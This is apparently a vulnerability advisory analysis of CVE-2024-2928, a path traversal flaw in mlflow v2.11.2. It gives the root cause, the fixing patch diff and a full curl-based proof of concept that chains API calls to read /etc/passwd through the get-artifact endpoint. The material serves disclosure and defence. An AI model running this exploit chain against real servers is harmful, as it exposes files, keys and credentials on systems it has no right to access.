1. Detailed Summary  
   • CVE Identifier: CVE-2024-2928  
   • Affected Component: mlflow server handlers (mlflow/mlflow)  
   • Vulnerability Type: CWE-29 (Path Traversal)  
   • Affected Version: mlflow v2.11.2 (fixed in v2.11.3)  
   • Description:  
     In mlflow v2.11.2, the code that processes the `artifact_location` URI when creating a new experiment validates only the query string for directory-traversal sequences (“../”) but fails to validate the fragment portion of the URI. An attacker can inject “../” sequences into the fragment component of the URI (everything after the `#`) to traverse out of the intended artifact directory and read arbitrary local files (e.g., `/etc/passwd`) via the `get-artifact` endpoint.  

2. Root Cause Analysis  
   • Code Path Affected: `_create_experiment()` in `mlflow/server/handlers.py`  
   • Faulty Logic:  
     – Uses `urllib.parse.urlparse(request_message.artifact_location)`  
     – Calls `validate_query_string(parsed_artifact_location.query)` to reject “../” in the query string, but does not check `parsed_artifact_location.fragment`.  
     – As a result, directory-traversal sequences in the fragment bypass the filter and are concatenated to the base directory when resolving file system paths.  
   • How the Code Assembles the File Path:  
     1. The experiment’s `artifact_location` is stored (including the fragment).  
     2. Later, when a client calls `/model-versions/get-artifact?path=<filename>…`, the server resolves the path by combining the stored `artifact_location` plus the requested `path`.  
     3. Because fragment traversal sequences were never rejected, the combined path can escape the intended directory.  

   • Patch Diff (commit 96f0b573a7 in v2.11.3)  
     ```diff
     --- a/mlflow/server/handlers.py
     +++ b/mlflow/server/handlers.py
     @@ -600,8 +600,12 @@ def _create_experiment():
          # Validate query string in artifact location to prevent attacks
          parsed_artifact_locaion = urllib.parse.urlparse(request_message.artifact_location)
     +    if parsed_artifact_locaion.fragment:
     +        raise MlflowException(
     +            "'artifact_location' URL can't include fragment part.",
     +            error_code=INVALID_PARAMETER_VALUE,
     +        )
          validate_query_string(parsed_artifact_locaion.query)
      ```
     – The added check explicitly rejects any URI that contains a fragment, closing the bypass.  

3. Exploitation Details / Proof of Concept  
   The advisory does not include a ready-made exploit script but provides step-by-step `curl` commands. An attacker with network access to the mlflow UI port (default 5000) and no authentication can read arbitrary files:

   1. Start the mlflow server (no authentication required by default):
      ```
      mlflow ui --host 127.0.0.1 --port 5000
      ```
   2. Create a malicious experiment whose `artifact_location` uses a fragment with traversal:
      ```
      curl -X POST http://127.0.0.1:5000/ajax-api/2.0/mlflow/experiments/create \
        -H 'Content-Type: application/json' \
        -d '{
              "name": "poc",
              "artifact_location": "http:///#/../../../../../../../../../../../../../../etc/"
            }'
      ```
      • Note the `#` replaces the “?” used in the previous patch, injecting `../` into the fragment.  

   3. Extract the returned `experiment_id` from the JSON response.  
   4. Create a new run under that experiment:
      ```
      curl -X POST http://127.0.0.1:5000/api/2.0/mlflow/runs/create \
        -H 'Content-Type: application/json' \
        -d '{"experiment_id": "<EXPERIMENT_ID>"}'
      ```
      • Capture the `run_id`.  
   5. Register a new model named “poc”:
      ```
      curl -X POST http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create \
        -H 'Content-Type: application/json' \
        -d '{"name": "poc"}'
      ```
   6. Link the model version to the malicious run and point its source to `file:///etc/`:
      ```
      curl -X POST http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create \
        -H 'Content-Type: application/json' \
        -d '{
              "name": "poc",
              "run_id": "<RUN_ID>",
              "source": "file:///etc/"
            }'
      ```
   7. Finally, read `/etc/passwd` via the `get-artifact` endpoint:
      ```
      curl 'http://127.0.0.1:5000/model-versions/get-artifact?path=passwd&name=poc&version=1'
      ```
      The response body will contain the contents of `/etc/passwd`.  

   Impact: An attacker can read any file accessible to the mlflow server process, including SSH keys, database credentials, and other sensitive configuration or data files. The fix in v2.11.3 (or later) rejects URIs with fragments altogether, closing this LFI bypass.